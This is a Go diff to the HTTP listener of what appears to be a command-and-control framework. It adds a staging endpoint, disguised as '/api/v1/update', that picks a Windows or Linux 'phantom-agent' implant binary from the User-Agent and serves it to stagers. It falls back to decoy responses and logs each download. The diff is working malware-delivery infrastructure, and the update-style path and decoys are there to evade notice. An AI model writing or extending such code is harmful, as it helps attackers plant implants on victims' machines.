@@ -3,9 +3,12 @@ package listener
 import (
 	"context"
 	"crypto/rsa"
+	"fmt"
 	"io"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -93,6 +96,9 @@ func (l *HTTPListener) Start() error {
 			mobileHandler.RegisterRoutes(mux)
 		}
 	}
+
+	// Staging endpoint — serves agent binaries to stagers
+	mux.HandleFunc("/api/v1/update", l.handleStaging)
 
 	// Catch-all for any other request
 	mux.HandleFunc("/", l.handleDecoy)
@@ -295,6 +301,55 @@ func (l *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 	}
 
 	l.writeResponse(w, httpResp)
+}
+
+// handleStaging serves agent binaries to stagers at /api/v1/update.
+// Determines OS from User-Agent and serves the appropriate binary.
+func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
+	ua := r.Header.Get("User-Agent")
+
+	// Find project root by walking up to go.mod
+	root := "."
+	dir, _ := os.Getwd()
+	for {
+		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
+			root = dir
+			break
+		}
+		parent := filepath.Dir(dir)
+		if parent == dir {
+			break
+		}
+		dir = parent
+	}
+
+	// Determine which agent binary to serve
+	var agentPath string
+	if strings.Contains(ua, "Windows") || strings.Contains(ua, "Win64") || strings.Contains(ua, "Win32") {
+		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
+	} else {
+		agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
+	}
+
+	data, err := os.ReadFile(agentPath)
+	if err != nil {
+		// Try the other OS as fallback
+		if strings.Contains(agentPath, "windows") {
+			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_linux_amd64")
+		} else {
+			agentPath = filepath.Join(root, "build", "agents", "phantom-agent_windows_amd64.exe")
+		}
+		data, err = os.ReadFile(agentPath)
+		if err != nil {
+			l.serveDecoy(w, r)
+			return
+		}
+	}
+
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
+	w.Write(data)
+	l.emitEvent("staging_download", extractIP(r), filepath.Base(agentPath))
 }
 
 // handleDecoy serves fake responses to non-agent traffic.
